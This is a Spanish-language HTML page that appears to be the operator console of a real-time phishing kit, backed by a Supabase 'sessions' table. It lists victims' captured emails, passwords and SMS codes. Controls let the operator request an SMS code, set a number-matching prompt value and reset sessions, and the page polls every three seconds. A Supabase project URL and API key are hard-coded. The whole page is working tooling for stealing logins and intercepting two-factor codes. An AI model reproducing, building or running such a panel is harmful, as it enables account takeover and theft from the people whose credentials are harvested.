<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Console Master</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body class="bg-zinc-950 text-zinc-400 font-sans p-4">
    <header class="max-w-xl mx-auto border-b border-zinc-900 pb-4 mb-6 flex justify-between items-center">
        <h1 class="text-white font-black italic">SV CONSOLE</h1>
        <button onclick="clearAll()" class="text-[10px] bg-red-900/20 text-red-500 px-3 py-1 rounded">LIMPIAR</button>
    </header>

    <main id="list" class="max-w-xl mx-auto space-y-4">
        <div class="text-center py-10">Cargando...</div>
    </main>

    <script>
        const S_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
        const S_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImV5cnZwbGVteGhub290cGp6a2F2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgyNTEwMDksImV4cCI6MjA4MzgyNzAwOX0.YxrnHYnBkQLqPuVH5izQdYYgL7GVZQgSG1h89sDVd0g";
        const client = supabase.createClient(S_URL, S_KEY);

        async function load() {
            const { data } = await client.from('sessions').select('*').order('updated_at', { ascending: false });
            const list = document.getElementById('list');
            if(!data || data.length === 0) { list.innerHTML = "<p class='text-center'>Sin sesiones</p>"; return; }

            list.innerHTML = data.map(s => `
                <div class="bg-zinc-900 p-5 rounded-2xl border border-zinc-800">
                    <div class="flex justify-between mb-4">
                        <div>
                            <p class="text-xs font-bold text-blue-500 mb-1 uppercase">${s.step}</p>
                            <p class="text-white font-bold">${s.email || '---'}</p>
                            <p class="text-[10px] font-mono text-zinc-500">${s.password || '---'}</p>
                        </div>
                        <button onclick="delS('${s.session_id}')" class="text-zinc-700">×</button>
                    </div>
                    
                    <div class="flex gap-2 mb-4">
                        <input type="number" id="n-${s.session_id}" value="${s.target_num || ''}" placeholder="G-#" 
                               class="w-16 bg-black border border-zinc-700 text-yellow-500 font-bold text-center rounded-xl">
                        <button onclick="sendNum('${s.session_id}')" class="flex-grow bg-blue-600 text-white font-bold py-3 rounded-xl text-xs uppercase">Poner Número</button>
                    </div>

                    <div class="grid grid-cols-2 gap-2">
                        <button onclick="changeStep('${s.session_id}', 'sms')" class="bg-zinc-800 text-white py-3 rounded-xl text-[10px] uppercase">Pedir SMS</button>
                        <button onclick="changeStep('${s.session_id}', 'login')" class="bg-zinc-800 text-zinc-500 py-3 rounded-xl text-[10px] uppercase">Reset</button>
                    </div>

                    ${s.sms_code ? `<div class="mt-4 p-3 bg-green-900/20 border border-green-900/50 rounded-xl text-center"><p class="text-white font-mono text-xl font-black">${s.sms_code}</p></div>` : ''}
                </div>
            `).join('');
        }

        window.sendNum = async (id) => {
            const val = document.getElementById(`n-${id}`).value;
            await client.from('sessions').update({ 
                target_num: val, 
                step: 'wait', // Forzamos el paso de espera
                updated_at: new Date().toISOString() 
            }).eq('session_id', id);
            load();
        };

        window.changeStep = async (id, step) => {
            await client.from('sessions').update({ step, updated_at: new Date().toISOString() }).eq('session_id', id);
            load();
        };

        window.delS = async (id) => { if(confirm('¿Borrar?')) await client.from('sessions').delete().eq('session_id', id); load(); };
        window.clearAll = async () => { if(confirm('¿Limpiar todo?')) { const {data} = await client.from('sessions').select('session_id'); if(data) for(const r of data) await client.from('sessions').delete().eq('session_id', r.session_id); } load(); };

        setInterval(load, 3000);
        load();
    </script>
</body>
</html>
